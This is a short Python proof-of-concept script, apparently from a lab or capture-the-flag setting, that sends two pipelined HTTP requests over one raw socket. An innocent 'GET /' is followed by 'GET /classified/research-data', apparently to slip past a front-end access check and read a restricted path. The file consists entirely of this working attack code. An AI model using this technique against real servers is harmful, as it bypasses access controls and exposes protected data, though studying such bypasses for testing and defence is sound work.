#!/usr/bin/env python3
import socket
import sys

host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 8888

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))
sock.settimeout(5)

payload = (
    f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n"
    f"GET /classified/research-data HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
)

sock.sendall(payload.encode())

response = b""
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
except socket.timeout:
    pass

sock.close()
print(response.decode('latin-1'))
